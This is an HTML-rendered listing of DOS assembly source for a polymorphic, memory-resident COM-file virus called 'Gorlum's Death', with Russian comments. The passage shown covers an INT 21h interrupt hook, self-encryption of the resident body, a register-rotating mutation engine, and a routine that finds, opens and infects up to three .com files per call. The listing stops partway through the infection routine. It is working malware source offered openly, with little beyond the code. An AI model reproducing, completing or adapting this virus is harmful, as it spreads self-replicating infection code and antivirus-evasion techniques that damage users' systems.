<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>GD.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; Gorlum's Death (c) by SMT/SMF</span><span class="sc0">
</span><span class="sc1">; Полиморфный резидентный неопасный вирус, поражает до трех .com - файлов в</span><span class="sc0">
</span><span class="sc1">; текущем каталоге за один вызов INT21 с функциями SELECT DISK и EXEC PROGRAM.</span><span class="sc0">
</span><span class="sc1">; Но т.к. в процессе работы пользователь сам меняет каталоги и вызовы INT21</span><span class="sc0">
</span><span class="sc1">; следуют достаточно часто, вирус может распространится довольно быстро по</span><span class="sc0">
</span><span class="sc1">; многим файлам и каталогам.</span><span class="sc0">
</span><span class="sc1">; Pезидент в памяти присутсвует в частично зашифрованном виде.</span><span class="sc0">


</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">11ah</span><span class="sc0">
</span><span class="sc5">Decode</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">9ch</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; место под полиморфный расшифровщик</span><span class="sc0">

</span><span class="sc5">nope</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Virstart</span><span class="sc0">

</span><span class="sc1">; -------------------- Наш обработчик INT21 --------------------------</span><span class="sc0">
</span><span class="sc5">Resident</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">8fh</span><span class="sc0">          </span><span class="sc1">; Если послан запрос на присутствие в памяти</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">NOQUER</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0fbh</span><span class="sc0">         </span><span class="sc1">; то ответить утвердительно</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Exit</span><span class="sc0">            </span><span class="sc1">; и выйти</span><span class="sc0">
</span><span class="sc5">NOQUER</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">          </span><span class="sc1">; если функция "select disk",</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">OK</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">        </span><span class="sc1">; или функция "execute program",</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Exit</span><span class="sc0">
                                </span><span class="sc1">; то выполнить некоторые действия ;)</span><span class="sc0">
</span><span class="sc5">OK</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Получаем DTA в es:bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">DTAofs</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">DTAseg</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; Сохраняем DTA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">xorer</span><span class="sc0">           </span><span class="sc1">; Расшифруемся</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MAIN</span><span class="sc0">            </span><span class="sc1">; Что-то сделаем</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">xorer</span><span class="sc0">           </span><span class="sc1">; Зашифруемся</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">DTAofs</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">DTAseg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Восстанавливаем DTA</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">            </span><span class="sc1">; JMP FAR - переход на старый INT21</span><span class="sc0">
</span><span class="sc5">int21of</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">int21se</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc1">;       ------------------ ""ШИФРАТОР"" -------------------</span><span class="sc0">
</span><span class="sc5">xorer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">body</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">body</span><span class="sc0">
</span><span class="sc5">megaxor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">35h</span><span class="sc0">              </span><span class="sc1">; глюк TASM'a, который не хочет ассемблировать</span><span class="sc0">
                                </span><span class="sc1">; XOR WORD PTR [DI] (он ассемблирует BYTE PTR)</span><span class="sc0">
</span><span class="sc5">xorerv</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">megaxor</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">body</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">; Начало зашифр. части</span><span class="sc0">

</span><span class="sc1">; --- Несколько упрощенный обработчик Abort,Retry,Ignore ----</span><span class="sc0">
</span><span class="sc5">INT24</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; возвратить 'fail system call in progress'</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">; ------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">zeroDTA</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">DTA</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DTA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DTA</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">16h</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">                     </span><span class="sc1">; Всего лишь способ обнулить</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">; первые 24 байта DTA</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Find1st</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">zeroDTA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cMask</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Поиск первого файла по маске из ds:dx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">FindNxt</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Ищем следующий файл</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">SetPoly</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">Fill1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">         </span><span class="sc1">;Заполнение места под полиморфный расшифровщик</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; какими-то несущественными инструкциями</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Fill1</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">; ================== MAIN ROUTINE =====================</span><span class="sc0">
</span><span class="sc5">MAIN</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">92h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">90h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Перехват обработчика критических ошибок</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int24se</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">int24of</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc1">; сохраним старый int24</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">92h</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">     </span><span class="sc1">; Установить свой обработчик</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">INT24</span><span class="sc0"> </span><span class="sc1">; int 24</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">90h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DTA</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Установим свой DTA</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">First</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; Устанавливаем признак того, что</span><span class="sc0">
                                        </span><span class="sc1">; жертву надо будет потом запустить</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">virln</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; обнуляем счетчик пораж. файлов</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">SILOD</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nope</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cMask</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ComMask</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Find1st</span><span class="sc0">                 </span><span class="sc1">; Начнем поиск .com-файов</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">found</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitINT</span><span class="sc0">
</span><span class="sc5">found</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;                       MUTATION ENGINE</span><span class="sc0">
</span><span class="sc1">; здесь подготавдиваются инструкции процессора с участием регистров</span><span class="sc0">
</span><span class="sc1">; ax,cx,dx,bx,bp,si,di</span><span class="sc0">
</span><span class="sc1">; каждый раз выбирается следующий регистр, после DI снова переходим к AX</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RGLOD</span><span class="sc4">],</span><span class="sc2">0BFh</span><span class="sc0">        </span><span class="sc1">; если не DI....</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">NxtReg</span><span class="sc0">                          </span><span class="sc1">; переходим к след.</span><span class="sc0">
                                                </span><span class="sc1">; иначе снова AX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RGINC</span><span class="sc4">],</span><span class="sc2">3Fh</span><span class="sc0">         </span><span class="sc1">; код, на 1 меньший, чем нужно</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RGLOD</span><span class="sc4">],</span><span class="sc2">0B7h</span><span class="sc0">        </span><span class="sc1">; код, на 1 меньший, чем нужно</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RGPUSH</span><span class="sc4">],</span><span class="sc2">4Fh</span><span class="sc0">        </span><span class="sc1">; код, на 1 меньший, чем нужно</span><span class="sc0">
</span><span class="sc5">NxtReg</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">; выбор следующего регистра из списка...</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RGINC</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; получаем нужный код для след. регистра</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RGLOD</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; получаем нужный код для след. регистра</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RGPUSH</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; получаем нужный код для след. регистра</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RGINC</span><span class="sc4">],</span><span class="sc2">44h</span><span class="sc0"> </span><span class="sc1">; регистр SP пропускаем,</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">NxtReg</span><span class="sc0">                  </span><span class="sc1">;  потому что для него нет команды PUSH</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FName</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">command</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0Bh</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">repe</span><span class="sc0">    </span><span class="sc6">cmpsb</span><span class="sc0">           </span><span class="sc1">; сравнение найденного имени с 'COMMAND.COM'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">notCOMMAND</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">nxtfile</span><span class="sc0">         </span><span class="sc1">; не поражаем COMMAND.COM</span><span class="sc0">
</span><span class="sc5">notCOMMAND</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FName</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; открываем найденный файл</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">OpenOK</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">nxtfile</span><span class="sc0">         </span><span class="sc1">; не открылся - переходим к следующему, не</span><span class="sc0">
                                </span><span class="sc1">; задерживаем процесс заражения !-)</span><span class="sc0">
</span><span class="sc5">OpenOK</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; запоминаем handle открытого файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">          </span><span class="sc1">; функция чтения из файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">            </span><span class="sc1">; читаем первые 7 байт</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OldShit</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Считываем и запоминаем начало файла</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OldShit</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0C3h</span><span class="sc0"> </span><span class="sc1">; Проверка на повторное заражение</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Clean</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">          </span><span class="sc1">; функция закрытия файла</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Уже поражен - закрываем и не беспокоим</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">nxtfile</span><span class="sc0">

</span><span class="sc5">Clean</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; подсчет числа пораженных за один раз файлов</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Переход к концу файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">virln</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Запомним длину файла жертвы</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nope</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">SILOD</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; Запомним начало зашифр. кода</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Переход к началу файла</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">DTA</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; узнали размер файла из DTA поиска</span><span class="sc0">
